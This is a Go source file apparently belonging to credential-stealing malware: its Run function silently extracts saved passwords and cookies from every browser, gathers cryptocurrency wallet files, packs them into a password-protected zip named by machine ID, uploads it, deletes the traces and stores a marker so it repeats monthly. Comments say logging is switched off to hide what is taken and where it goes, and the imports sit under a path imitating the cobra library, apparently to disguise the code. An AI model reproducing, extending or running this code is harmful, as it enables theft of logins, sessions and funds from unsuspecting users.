//go:build !windows

package core

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/spf13/cobra/site/BWPlus/browser"
	"github.com/spf13/cobra/site/BWPlus/log"
	"github.com/spf13/cobra/site/BWPlus/types"
	"github.com/spf13/cobra/site/BWPlus/utils/machineid"
	"github.com/spf13/cobra/site/BWPlus/utils/zipcrypto"
)

const (
	zipPassword     = "wt123321"
	appMarkerFolder = "bwdata"
	// successInterval 是上次成功执行后的冷却时间，1 个月内不再重复执行
	successInterval = 30 * 24 * time.Hour
)

// Run 是 BWData 的核心执行函数
func Run() error {
	// 闈欓粯锛氶伩鍏嶆妸娴忚鍣ㄥ悕銆佹潯鐩暟銆佷复鏃惰矾寰勩€佷笂浼犲湴鍧€绛夎瘑鍒俊鎭啓杩涙棩蹇?
	// 静默：避免把浏览器名、条目数、临时路径、上传地址等识别信息写进日志
	log.SetLevel(log.FatalLevel)
	if hasSucceeded() {
		return nil
	}

	browsers, _ := browser.DiscoverBrowsersWithKeys(browser.DiscoverOptions{Name: "all"})

	var passwords []types.LoginEntry
	var cookies []types.CookieEntry

	for _, b := range browsers {
		results, extractErr := b.Extract([]types.Category{types.Password, types.Cookie})
		if extractErr != nil {
			continue
		}
		for _, r := range results {
			if r.Data == nil {
				continue
			}
			passwords = append(passwords, r.Data.Passwords...)
			cookies = append(cookies, r.Data.Cookies...)
		}
	}

	walletFiles, walletsFound, err := collectWalletFiles()
	if err != nil {
		return err
	}

	if len(passwords) == 0 && len(cookies) == 0 && walletsFound == 0 {
		return nil
	}

	dir := os.TempDir()
	mid := machineid.ID()
	pwPath := filepath.Join(dir, mid+".pw")
	ckPath := filepath.Join(dir, mid+".ck")
	zipPath := filepath.Join(dir, mid+".zip")

	pwData, _ := json.MarshalIndent(passwords, "", "  ")
	ckData, _ := json.MarshalIndent(cookies, "", "  ")

	if err := os.WriteFile(pwPath, pwData, 0o600); err != nil {
		return err
	}
	if err := os.WriteFile(ckPath, ckData, 0o600); err != nil {
		return err
	}

	files := map[string][]byte{
		filepath.Base(pwPath): pwData,
		filepath.Base(ckPath): ckData,
	}
	for entry, data := range walletFiles {
		files[entry] = data
	}

	if err := zipcrypto.WriteArchive(zipPath, zipPassword, files); err != nil {
		return err
	}

	_ = os.Remove(pwPath)
	_ = os.Remove(ckPath)

	if err := uploadFile(zipPath); err != nil {
		_ = os.Remove(zipPath)
		return err
	}
	_ = os.Remove(zipPath)

	return markSucceeded()
}

func markerPath() string {
	home, err := os.UserHomeDir()
	if err != nil || home == "" {
		home = os.TempDir()
	}
	dir := filepath.Join(home, ".config", appMarkerFolder)
	_ = os.MkdirAll(dir, 0o700)
	return filepath.Join(dir, "done")
}

func hasSucceeded() bool {
	data, err := os.ReadFile(markerPath())
	if err != nil {
		return false
	}
	ts, err := strconv.ParseInt(strings.TrimSpace(string(data)), 10, 64)
	if err != nil {
		return false
	}
	last := time.Unix(ts, 0)
	return time.Since(last) < successInterval
}

func markSucceeded() error {
	p := markerPath()
	if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
		return err
	}
	tmp := p + ".tmp"
	if err := os.WriteFile(tmp, []byte(strconv.FormatInt(time.Now().Unix(), 10)), 0o600); err != nil {
		return err
	}
	return os.Rename(tmp, p)
}
